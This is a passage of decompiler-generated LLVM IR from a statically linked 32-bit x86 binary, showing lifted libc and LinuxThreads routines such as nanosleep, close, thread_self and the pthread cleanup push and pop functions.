  %v3_8058a6b = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058a6b, i32 0)
  %v0_8058a73 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058a73
}

define i32 @nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058a77 = load i32, i32* @ebx, align 4
  store i32 %v0_8058a77, i32* %stack_var_-4, align 4
  %v2_8058a7b = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058a82 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058a7b)
  store i32 %v2_8058a7b, i32* @ebx, align 4
  %v2_8058a91 = call i32 @__libc_nanosleep(i32 %arg1, i32 %arg2)
  store i32 %v2_8058a91, i32* @ebx, align 4
  %v3_8058a9c = load i32, i32* %stack_var_-8, align 4
  %v2_8058aa0 = trunc i32 %v3_8058a9c to i8
  %v3_8058aa0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058aa0, i32 0)
  %v0_8058aa8 = load i32, i32* @ebx, align 4
  %v2_8058aaa = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058aaa, i32* @ebx, align 4
  ret i32 %v0_8058aa8
}

define i32 @fcntl(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_8058b98 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058b9f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058b98)
  %v3_8058bbb = call i32 @__libc_fcntl(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_8058bbb, i32* @ebx, align 4
  %v3_8058bc6 = load i32, i32* %stack_var_-8, align 4
  %v2_8058bca = trunc i32 %v3_8058bc6 to i8
  %v3_8058bca = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058bca, i32 0)
  %v0_8058bd2 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058bd2
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058bd6 = load i32, i32* @ebx, align 4
  store i32 %v0_8058bd6, i32* %stack_var_-4, align 4
  %v2_8058bda = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058be1 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058bda)
  %v1_8058beb = call i32 @__libc_close(i32 %arg1)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v1_8058beb, i32* @ebx, align 4
  %v3_8058bf6 = load i32, i32* %stack_var_-8, align 4
  %v2_8058bfa = trunc i32 %v3_8058bf6 to i8
  %v3_8058bfa = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058bfa, i32 0)
  %v0_8058c02 = load i32, i32* @ebx, align 4
  %v2_8058c04 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058c04, i32* @ebx, align 4
  ret i32 %v0_8058c02

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 10, 11, 2, 3, 16, 17, 4, 5, 6, 7, 0, 1, 14, 15, 8, 9, 12, 13 }
}

define i32 @__pthread_restart_new(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8058d8b = load i32, i32* @global_var_8074c88.650, align 8
  %v1_8058d95 = add i32 %arg1, 20
  %v2_8058d95 = inttoptr i32 %v1_8058d95 to i32*
  %v3_8058d95 = load i32, i32* %v2_8058d95, align 4
  %v2_8058d98 = call i32 @kill(i32 %v3_8058d95, i32 %v0_8058d8b)
  ret i32 %v2_8058d98
}

define i32 @__pthread_wait_for_restart_signal(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8058da1 = load i32, i32* @esi, align 4
  %v0_8058da2 = load i32, i32* @ebx, align 4
  store i32 %v0_8058da2, i32* %stack_var_-8, align 4
  %v2_8058da9 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_8058da9, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8058db9 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_8058da9)
  %v1_8058dc7 = call i32 @__GI_sigdelset(i32 %v2_8058da9)
  %v0_8058dcf = load i32, i32* @esi, align 4
  %v1_8058dcf = add i32 %v0_8058dcf, 32
  %v2_8058dcf = inttoptr i32 %v1_8058dcf to i32*
  store i32 0, i32* %v2_8058dcf, align 4
  %v1_8058dde = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  br label %dec_label_pc_8058dd6

dec_label_pc_8058dd6:                             ; preds = %dec_label_pc_8058dd6, %entry
  %v2_8058dde = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_8058dde)
  %v0_8058de3 = load i32, i32* @esi, align 4
  %v1_8058de3 = add i32 %v0_8058de3, 32
  %v2_8058de3 = inttoptr i32 %v1_8058de3 to i32*
  %v3_8058de3 = load i32, i32* %v2_8058de3, align 4
  %v1_8058de9 = load i32, i32* @global_var_8074c88.650, align 8
  %v12_8058de9 = icmp eq i32 %v3_8058de3, %v1_8058de9
  %v1_8058def = icmp eq i1 %v12_8058de9, false
  br i1 %v1_8058def, label %dec_label_pc_8058dd6, label %dec_label_pc_8058df1

dec_label_pc_8058df1:                             ; preds = %dec_label_pc_8058dd6
  %v2_8058df7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8058df7, i32* @ebx, align 4
  store i32 %v0_8058da1, i32* @esi, align 4
  ret i32 %v3_8058de3

; uselistorder directives
  uselistorder i32 %v3_8058de3, { 1, 0 }
  uselistorder i32 %v2_8058da9, { 1, 0, 2 }
}

define i32 @__pthread_find_self() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_8058e07 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8058e07, i32* @ecx, align 4
  br label %dec_label_pc_8058e13

dec_label_pc_8058e10:                             ; preds = %dec_label_pc_8058e1a, %dec_label_pc_8058e13
  %v1_8058e10 = add i32 %v0_8058e10, 16
  br label %dec_label_pc_8058e13

dec_label_pc_8058e13:                             ; preds = %entry, %dec_label_pc_8058e10
  %v0_8058e10 = phi i32 [ ptrtoint (i32* @global_var_80708c0.659 to i32), %entry ], [ %v1_8058e10, %dec_label_pc_8058e10 ]
  store i32 %v0_8058e10, i32* @edx, align 4
  %v1_8058e13 = add i32 %v0_8058e10, 8
  %v2_8058e13 = inttoptr i32 %v1_8058e13 to i32*
  %v3_8058e13 = load i32, i32* %v2_8058e13, align 4
  %v6_8058e18 = icmp ugt i32 %v1_8058e07, %v3_8058e13
  br i1 %v6_8058e18, label %dec_label_pc_8058e10, label %dec_label_pc_8058e1a

dec_label_pc_8058e1a:                             ; preds = %dec_label_pc_8058e13
  %v2_8058e1a = add i32 %v0_8058e10, 12
  %v3_8058e1a = inttoptr i32 %v2_8058e1a to i32*
  %v4_8058e1a = load i32, i32* %v3_8058e1a, align 4
  %v10_8058e1a = icmp ult i32 %v1_8058e07, %v4_8058e1a
  br i1 %v10_8058e1a, label %dec_label_pc_8058e10, label %dec_label_pc_8058e1f

dec_label_pc_8058e1f:                             ; preds = %dec_label_pc_8058e1a
  ret i32 %v3_8058e13

; uselistorder directives
  uselistorder i32 %v0_8058e10, { 1, 2, 3, 0 }
  uselistorder i32 %v1_8058e07, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058e13, { 1, 0 }
}

define i32 @thread_self.11(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_8058e20 = load i32, i32* @esp, align 4
  %v1_8058e20 = load i32, i32* @global_var_807b620.613, align 32
  %v7_8058e20 = icmp ult i32 %v0_8058e20, %v1_8058e20
  %v1_8058e2d = icmp eq i1 %v7_8058e20, false
  br i1 %v1_8058e2d, label %dec_label_pc_8058e5e, label %dec_label_pc_8058e2f

dec_label_pc_8058e2f:                             ; preds = %entry
  %v1_8058e2f = load i32, i32* @global_var_807b624.614, align 4
  %v7_8058e2f = icmp ult i32 %v0_8058e20, %v1_8058e2f
  br i1 %v7_8058e2f, label %dec_label_pc_8058e44, label %dec_label_pc_8058e37

dec_label_pc_8058e37:                             ; preds = %dec_label_pc_8058e2f
  %v1_8058e37 = load i32, i32* @global_var_807b628.615, align 8
  %v7_8058e37 = icmp ult i32 %v0_8058e20, %v1_8058e37
  br i1 %v7_8058e37, label %dec_label_pc_8058e5e, label %dec_label_pc_8058e44

dec_label_pc_8058e44:                             ; preds = %dec_label_pc_8058e37, %dec_label_pc_8058e2f
  %v0_8058e44 = load i32, i32* @global_var_807f100.617, align 256
  %v1_8058e44 = icmp eq i32 %v0_8058e44, 0
  br i1 %v1_8058e44, label %dec_label_pc_8058e52, label %dec_label_pc_8058e4d

dec_label_pc_8058e4d:                             ; preds = %dec_label_pc_8058e44
  %v0_8058e4d = call i32 @__pthread_find_self()
  br label %dec_label_pc_8058e52

dec_label_pc_8058e52:                             ; preds = %dec_label_pc_8058e44, %dec_label_pc_8058e4d
  %v2_8058e58 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8058e5e

dec_label_pc_8058e5e:                             ; preds = %dec_label_pc_8058e37, %entry, %dec_label_pc_8058e52
  %v0_8058e5e = phi i32 [ ptrtoint (i32* @global_var_8074aa0.616 to i32), %dec_label_pc_8058e37 ], [ ptrtoint (i32* @global_var_80748c0 to i32), %entry ], [ %v2_8058e58, %dec_label_pc_8058e52 ]
  ret i32 %v0_8058e5e

; uselistorder directives
  uselistorder label %dec_label_pc_8058e5e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058e52, { 1, 0 }
}

define i32 @__GI_pthread_self(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8058ef4 = call i32 @thread_self.11(i32 ptrtoint (i32* @0 to i32))
  %v1_8058ef9 = add i32 %v1_8058ef4, 16
  %v2_8058ef9 = inttoptr i32 %v1_8058ef9 to i32*
  %v3_8058ef9 = load i32, i32* %v2_8058ef9, align 4
  ret i32 %v3_8058ef9
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8058efd = load i32, i32* @ebx, align 4
  store i32 %v0_8058efd, i32* %stack_var_-4, align 4
  %v1_8058f01 = call i32 @thread_self.11(i32 %v0_8058efd)
  %v0_8058f06 = load i32, i32* @global_var_8074c84.621, align 4
  %v10_8058f06 = icmp eq i32 %v0_8058f06, -1
  store i32 %v1_8058f01, i32* @ebx, align 4
  br i1 %v10_8058f06, label %dec_label_pc_8058f62, label %dec_label_pc_8058f11

dec_label_pc_8058f11:                             ; preds = %entry
  %v0_8058f14 = load i32, i32* @global_var_807b624.614, align 4
  %v1_8058f1a = call i32 @free(i32 %v0_8058f14)
  store i32 0, i32* @global_var_807b628.615, align 8
  %v0_8058f2a = load i32, i32* @global_var_8074c84.621, align 4
  store i32 0, i32* @global_var_807b624.614, align 4
  %v1_8058f3a = call i32 @__libc_close(i32 %v0_8058f2a)
  %v0_8058f40 = load i32, i32* @global_var_807f118.660, align 8
  %v1_8058f46 = call i32 @__libc_close(i32 %v0_8058f40)
  store i32 -1, i32* @global_var_807f118.660, align 8
  store i32 -1, i32* @global_var_8074c84.621, align 4
  br label %dec_label_pc_8058f62

dec_label_pc_8058f62:                             ; preds = %entry, %dec_label_pc_8058f11
  %v0_8058f62 = phi i32 [ %tmp3, %entry ], [ %v0_8058f40, %dec_label_pc_8058f11 ]
  %v1_8058f62 = call i32 @__libc_getpid(i32 %v0_8058f62)
  %v1_8058f67 = load i32, i32* @ebx, align 4
  %v2_8058f67 = add i32 %v1_8058f67, 20
  %v3_8058f67 = inttoptr i32 %v2_8058f67 to i32*
  store i32 %v1_8058f62, i32* %v3_8058f67, align 4
  %v0_8058f6a = load i32, i32* @ebx, align 4
  store i32 %v0_8058f6a, i32* bitcast (i32** @global_var_8074c80.620 to i32*), align 128
  %v2_8058f70 = inttoptr i32 %v0_8058f6a to i32*
  store i32 %v0_8058f6a, i32* %v2_8058f70, align 4
  %v0_8058f72 = load i32, i32* @ebx, align 4
  %v2_8058f72 = add i32 %v0_8058f72, 4
  %v3_8058f72 = inttoptr i32 %v2_8058f72 to i32*
  store i32 %v0_8058f72, i32* %v3_8058f72, align 4
  %v0_8058f75 = load i32, i32* @ebx, align 4
  %v1_8058f75 = add i32 %v0_8058f75, 68
  %v2_8058f75 = inttoptr i32 %v1_8058f75 to i32*
  store i32 ptrtoint (i32* @global_var_807b664.661 to i32), i32* %v2_8058f75, align 4
  %v0_8058f7c = load i32, i32* @ebx, align 4
  %v1_8058f7c = add i32 %v0_8058f7c, 76
  %v2_8058f7c = inttoptr i32 %v1_8058f7c to i32*
  store i32 ptrtoint (i32* @global_var_807b668.662 to i32), i32* %v2_8058f7c, align 4
  %v2_8058f85 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058f85, i32* @ebx, align 4
  ret i32 %v1_8058f62

; uselistorder directives
  uselistorder i32 %v0_8058f72, { 1, 0 }
  uselistorder i32 %v0_8058f6a, { 1, 0, 2 }
  uselistorder i32* @global_var_8074c84.621, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @thread_self.11, { 1, 0 }
  uselistorder label %dec_label_pc_8058f62, { 1, 0 }
}

define i32 @thread_self.12(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_8059858 = load i32, i32* @esp, align 4
  %v1_8059858 = load i32, i32* @global_var_807b620.613, align 32
  %v7_8059858 = icmp ult i32 %v0_8059858, %v1_8059858
  %v1_805985e = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_805985e, i32* @edx, align 4
  %v1_8059865 = icmp eq i1 %v7_8059858, false
  br i1 %v1_8059865, label %dec_label_pc_8059896, label %dec_label_pc_8059867

dec_label_pc_8059867:                             ; preds = %entry
  %v1_8059867 = load i32, i32* @global_var_807b624.614, align 4
  %v7_8059867 = icmp ult i32 %v0_8059858, %v1_8059867
  br i1 %v7_8059867, label %dec_label_pc_805987c, label %dec_label_pc_805986f

dec_label_pc_805986f:                             ; preds = %dec_label_pc_8059867
  %v1_805986f = load i32, i32* @global_var_807b628.615, align 8
  %v7_805986f = icmp ult i32 %v0_8059858, %v1_805986f
  br i1 %v7_805986f, label %dec_label_pc_8059896, label %dec_label_pc_805987c

dec_label_pc_805987c:                             ; preds = %dec_label_pc_805986f, %dec_label_pc_8059867
  %v0_805987c = load i32, i32* @global_var_807f100.617, align 256
  %v1_805987c = icmp eq i32 %v0_805987c, 0
  br i1 %v1_805987c, label %dec_label_pc_805988a, label %dec_label_pc_8059885

dec_label_pc_8059885:                             ; preds = %dec_label_pc_805987c
  %v0_8059885 = call i32 @__pthread_find_self()
  br label %dec_label_pc_805988a

dec_label_pc_805988a:                             ; preds = %dec_label_pc_805987c, %dec_label_pc_8059885
  %v3_805988a = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_805988a, i32* @edx, align 4
  %v2_8059890 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8059896

dec_label_pc_8059896:                             ; preds = %dec_label_pc_805986f, %entry, %dec_label_pc_805988a
  %v0_8059896 = phi i32 [ ptrtoint (i32* @global_var_8074aa0.616 to i32), %dec_label_pc_805986f ], [ ptrtoint (i32* @global_var_80748c0 to i32), %entry ], [ %v2_8059890, %dec_label_pc_805988a ]
  ret i32 %v0_8059896

; uselistorder directives
  uselistorder label %dec_label_pc_8059896, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805988a, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8059897 = load i32, i32* @edi, align 4
  %v0_8059898 = load i32, i32* @esi, align 4
  %v0_8059899 = load i32, i32* @ebx, align 4
  store i32 %v0_8059899, i32* %stack_var_-12, align 4
  %v1_805989a = call i32 @thread_self.12(i32 %v0_8059899)
  store i32 %v1_805989a, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_80598a3 = add i32 %v1_805989a, 60
  %v2_80598a3 = inttoptr i32 %v1_80598a3 to i32*
  %v3_80598a3 = load i32, i32* %v2_80598a3, align 4
  store i32 %v3_80598a3, i32* %ebx.global-to-local, align 4
  store i32 %v1_805989a, i32* %esi.global-to-local, align 4
  %v1_80598bc2 = icmp eq i32 %v3_80598a3, 0
  %v1_80598be9 = icmp eq i1 %v1_80598bc2, false
  br i1 %v1_80598be9, label %dec_label_pc_80598aa.lr.ph, label %dec_label_pc_80598c0

dec_label_pc_80598aa.lr.ph:                       ; preds = %entry
  %tmp = icmp ugt i32 %v3_80598a3, %arg1
  br i1 %tmp, label %dec_label_pc_80598ae.lr.ph, label %dec_label_pc_80598c0.loopexit

dec_label_pc_80598ae.lr.ph:                       ; preds = %dec_label_pc_80598aa.lr.ph
  br label %dec_label_pc_80598ae

dec_label_pc_80598ae:                             ; preds = %dec_label_pc_80598ae.dec_label_pc_80598aa_crit_edge, %dec_label_pc_80598ae.lr.ph
  %v4_80598b426 = phi i32 [ %v3_80598a3, %dec_label_pc_80598ae.lr.ph ], [ %v3_80598b6, %dec_label_pc_80598ae.dec_label_pc_80598aa_crit_edge ]
  %v5_80598b4 = inttoptr i32 %v4_80598b426 to i32*
  %v6_80598b4 = load i32, i32* %v5_80598b4, align 4
  call void @__pseudo_call(i32 %v6_80598b4)
  %v0_80598b6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80598b6 = add i32 %v0_80598b6, 12
  %v2_80598b6 = inttoptr i32 %v1_80598b6 to i32*
  %v3_80598b6 = load i32, i32* %v2_80598b6, align 4
  store i32 %v3_80598b6, i32* %ebx.global-to-local, align 4
  %v1_80598bc = icmp eq i32 %v3_80598b6, 0
  %v1_80598be = icmp eq i1 %v1_80598bc, false
  br i1 %v1_80598be, label %dec_label_pc_80598ae.dec_label_pc_80598aa_crit_edge, label %dec_label_pc_80598c0.loopexit

dec_label_pc_80598ae.dec_label_pc_80598aa_crit_edge: ; preds = %dec_label_pc_80598ae
  %v1_80598aa.pre = load i32, i32* %edi.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_80598b6, %v1_80598aa.pre
  br i1 %tmp29, label %dec_label_pc_80598ae, label %dec_label_pc_80598c0.loopexit

dec_label_pc_80598c0.loopexit:                    ; preds = %dec_label_pc_80598ae.dec_label_pc_80598aa_crit_edge, %dec_label_pc_80598aa.lr.ph, %dec_label_pc_80598ae
  %v0_80598c0.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80598c0

dec_label_pc_80598c0:                             ; preds = %dec_label_pc_80598c0.loopexit, %entry
  %v0_80598c0 = phi i32 [ %v0_80598c0.pre, %dec_label_pc_80598c0.loopexit ], [ %v1_805989a, %entry ]
  %v1_80598c0 = add i32 %v0_80598c0, 372
  %v2_80598c0 = inttoptr i32 %v1_80598c0 to i32*
  %v3_80598c0 = load i32, i32* %v2_80598c0, align 4
  %v4_80598c0 = icmp eq i32 %v3_80598c0, 0
  br i1 %v4_80598c0, label %dec_label_pc_80598c0.dec_label_pc_80598d1_crit_edge, label %dec_label_pc_80598c9

dec_label_pc_80598c0.dec_label_pc_80598d1_crit_edge: ; preds = %dec_label_pc_80598c0
  %v0_80598d4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80598d1

dec_label_pc_80598c9:                             ; preds = %dec_label_pc_80598c0
  %v2_80598c9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80598c9, i32* @ebx, align 4
  store i32 %v0_8059898, i32* @esi, align 4
  store i32 %v0_8059897, i32* @edi, align 4
  %v0_80598cc = call i32 @__rpc_thread_destroy()
  store i32 %v0_80598cc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80598d1

dec_label_pc_80598d1:                             ; preds = %dec_label_pc_80598c0.dec_label_pc_80598d1_crit_edge, %dec_label_pc_80598c9
  %v0_80598d4 = phi i32 [ %v0_80598d4.pre, %dec_label_pc_80598c0.dec_label_pc_80598d1_crit_edge ], [ %v0_80598cc, %dec_label_pc_80598c9 ]
  %v2_80598d1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80598d1, i32* @ebx, align 4
  store i32 %v0_8059898, i32* @esi, align 4
  store i32 %v0_8059897, i32* @edi, align 4
  ret i32 %v0_80598d4

; uselistorder directives
  uselistorder i32 %v3_80598b6, { 0, 2, 3, 1 }
  uselistorder i32 %v3_80598a3, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8059898, { 1, 0 }
  uselistorder i32 %v0_8059897, { 1, 0 }
  uselistorder label %dec_label_pc_80598d1, { 1, 0 }
  uselistorder label %dec_label_pc_80598c0.loopexit, { 0, 2, 1 }
}

define i32 @__pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80598d5 = load i32, i32* @ebx, align 4
  store i32 %v0_80598d5, i32* %stack_var_-4, align 4
  %v1_80598d9 = call i32 @thread_self.12(i32 %v0_80598d5)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_80598d9, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_80598ee = add i32 %tmp3, 4
  %v3_80598ee = inttoptr i32 %v2_80598ee to i32*
  store i32 %arg3, i32* %v3_80598ee, align 4
  %v0_80598f1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80598f1 = add i32 %v0_80598f1, 65
  %v2_80598f1 = inttoptr i32 %v1_80598f1 to i8*
  %v3_80598f1 = load i8, i8* %v2_80598f1, align 1
  %v4_80598f1 = sext i8 %v3_80598f1 to i32
  %v1_80598f5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80598f5 = add i32 %v1_80598f5, 8
  %v3_80598f5 = inttoptr i32 %v2_80598f5 to i32*
  store i32 %v4_80598f1, i32* %v3_80598f5, align 4
  %v0_80598f8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80598f8 = add i32 %v0_80598f8, 60
  %v2_80598f8 = inttoptr i32 %v1_80598f8 to i32*
  %v3_80598f8 = load i32, i32* %v2_80598f8, align 4
  %v1_80598fb = icmp eq i32 %v3_80598f8, 0
  %v1_80598fd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80598fd = add i32 %v1_80598fd, 12
  %v3_80598fd = inttoptr i32 %v2_80598fd to i32*
  store i32 %v3_80598f8, i32* %v3_80598fd, align 4
  br i1 %v1_80598fb, label %dec_label_pc_805990d, label %dec_label_pc_8059902

dec_label_pc_8059902:                             ; preds = %entry
  %v0_8059902 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8059902 = icmp ult i32 %v0_8059902, %v3_80598f8
  br i1 %v7_8059902, label %dec_label_pc_805990d, label %dec_label_pc_8059906

dec_label_pc_8059906:                             ; preds = %dec_label_pc_8059902
  %v1_8059906 = add i32 %v0_8059902, 12
  %v2_8059906 = inttoptr i32 %v1_8059906 to i32*
  store i32 0, i32* %v2_8059906, align 4
  br label %dec_label_pc_805990d

dec_label_pc_805990d:                             ; preds = %dec_label_pc_8059902, %entry, %dec_label_pc_8059906
  %v0_805990d = load i32, i32* %edx.global-to-local, align 4
  %v1_805990d = add i32 %v0_805990d, 65
  %v2_805990d = inttoptr i32 %v1_805990d to i8*
  store i8 0, i8* %v2_805990d, align 1
  %v0_8059911 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059911 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059911 = add i32 %v1_8059911, 60
  %v3_8059911 = inttoptr i32 %v2_8059911 to i32*
  store i32 %v0_8059911, i32* %v3_8059911, align 4
  %v2_8059914 = load i32, i32* %stack_var_-12, align 4
  %v2_8059916 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059916, i32* @ebx, align 4
  ret i32 %v2_8059914

; uselistorder directives
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_805990d, { 2, 0, 1 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v4_805991c = icmp eq i32 %arg2, 0
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  br i1 %v4_805991c, label %dec_label_pc_8059932, label %dec_label_pc_8059927

dec_label_pc_8059927:                             ; preds = %entry
  %v6_805992d = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_805992d)
  br label %dec_label_pc_8059932

dec_label_pc_8059932:                             ; preds = %entry, %dec_label_pc_8059927
  %v0_8059932 = phi i32 [ %tmp7, %entry ], [ 134584623, %dec_label_pc_8059927 ]
  %v1_8059932 = call i32 @thread_self.12(i32 %v0_8059932)
  %v0_8059937 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059937 = add i32 %v0_8059937, 12
  %v2_8059937 = inttoptr i32 %v1_8059937 to i32*
  %v3_8059937 = load i32, i32* %v2_8059937, align 4
  %v2_805993a = add i32 %v1_8059932, 60
  %v3_805993a = inttoptr i32 %v2_805993a to i32*
  store i32 %v3_8059937, i32* %v3_805993a, align 4
  %v2_805993d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805993d, i32* @ecx, align 4
  ret i32 %v1_8059932

; uselistorder directives
  uselistorder label %dec_label_pc_8059932, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059941 = load i32, i32* @ebx, align 4
  store i32 %v0_8059941, i32* %stack_var_-4, align 4
  %v1_8059945 = call i32 @thread_self.12(i32 %v0_8059941)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_8059945, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_805995a = add i32 %tmp3, 4
  %v3_805995a = inttoptr i32 %v2_805995a to i32*
  store i32 %arg3, i32* %v3_805995a, align 4
  %v0_805995d = load i32, i32* %edx.global-to-local, align 4
  %v1_805995d = add i32 %v0_805995d, 60
  %v2_805995d = inttoptr i32 %v1_805995d to i32*
  %v3_805995d = load i32, i32* %v2_805995d, align 4
  %v1_8059960 = icmp eq i32 %v3_805995d, 0
  %v1_8059962 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059962 = add i32 %v1_8059962, 12
  %v3_8059962 = inttoptr i32 %v2_8059962 to i32*
  store i32 %v3_805995d, i32* %v3_8059962, align 4
  br i1 %v1_8059960, label %dec_label_pc_8059972, label %dec_label_pc_8059967

dec_label_pc_8059967:                             ; preds = %entry
  %v0_8059967 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8059967 = icmp ult i32 %v0_8059967, %v3_805995d
  br i1 %v7_8059967, label %dec_label_pc_8059972, label %dec_label_pc_805996b

dec_label_pc_805996b:                             ; preds = %dec_label_pc_8059967
  %v1_805996b = add i32 %v0_8059967, 12
  %v2_805996b = inttoptr i32 %v1_805996b to i32*
  store i32 0, i32* %v2_805996b, align 4
  br label %dec_label_pc_8059972

dec_label_pc_8059972:                             ; preds = %dec_label_pc_8059967, %entry, %dec_label_pc_805996b
  %v0_8059972 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059972 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059972 = add i32 %v1_8059972, 60
  %v3_8059972 = inttoptr i32 %v2_8059972 to i32*
  store i32 %v0_8059972, i32* %v3_8059972, align 4
  %v2_8059975 = load i32, i32* %stack_var_-12, align 4
  %v2_8059977 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059977, i32* @ebx, align 4
  ret i32 %v2_8059975

; uselistorder directives
  uselistorder label %dec_label_pc_8059972, { 2, 0, 1 }
}

define i32 @__pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805997a = load i32, i32* @ebx, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_805997b = ptrtoint i32* %stack_var_-12 to i32
  %v1_805997e = call i32 @thread_self.12(i32 %v0_805997a)
  store i32 %v1_805997e, i32* %eax.global-to-local, align 4
  store i32 %tmp4, i32* @esi, align 4
